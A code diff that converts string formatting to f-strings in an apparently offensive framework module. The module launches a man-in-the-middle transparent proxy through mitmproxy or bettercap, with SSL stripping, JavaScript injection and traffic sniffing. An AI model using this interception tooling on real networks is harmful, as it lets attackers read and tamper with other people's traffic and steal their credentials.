@@ -77,7 +77,7 @@ class Exploit(Exploit):
         if self.ssl_strip:
             cmd.append("--ssl-insecure")
 
-        print_status("Starting mitmproxy transparent mode on :{} ...".format(self.proxy_port))
+        print_status(f"Starting mitmproxy transparent mode on :{self.proxy_port} ...")
         subprocess.run(cmd, check=False)
 
     def _run_bettercap(self) -> None:
@@ -87,11 +87,11 @@ class Exploit(Exploit):
             return
 
         caplet_lines = [
-            "set http.proxy.port {}".format(self.proxy_port),
+            f"set http.proxy.port {self.proxy_port}",
             "set http.proxy.sslstrip {}".format("true" if self.ssl_strip else "false"),
         ]
         if self.inject_js:
-            caplet_lines.append("set http.proxy.script {}".format(self.inject_js))
+            caplet_lines.append(f"set http.proxy.script {self.inject_js}")
 
         caplet_lines.append("http.proxy on")
         caplet_lines.append("net.sniff on")
@@ -101,7 +101,7 @@ class Exploit(Exploit):
         caplet.write_text("\n".join(caplet_lines), encoding="utf-8")
 
         cmd = ["sudo", "bettercap", "-iface", self.interface, "-caplet", str(caplet)]
-        print_status("Starting bettercap proxy on {} ...".format(self.interface))
+        print_status(f"Starting bettercap proxy on {self.interface} ...")
         subprocess.run(cmd, check=False)
 
     def _run_builtin(self) -> None:
@@ -122,7 +122,7 @@ class Exploit(Exploit):
         ]
         env = os.environ.copy()
         env["PYTHONUNBUFFERED"] = "1"
-        print_status("Starting builtin lightweight proxy fallback on :{} ...".format(self.proxy_port))
+        print_status(f"Starting builtin lightweight proxy fallback on :{self.proxy_port} ...")
         print_info("For full transparent mode, prefer backend=mitmproxy or backend=bettercap.")
         subprocess.run(cmd, env=env, check=False)
 
@@ -165,8 +165,7 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("DRY RUN — Transparent Proxy")
-            print_info("Backend: {} | Port: {} | Interface: {}".format(
-                self.backend, self.proxy_port, self.interface))
+            print_info(f"Backend: {self.backend} | Port: {self.proxy_port} | Interface: {self.interface}")
             return
 
         log_path = Path(self.log_file)
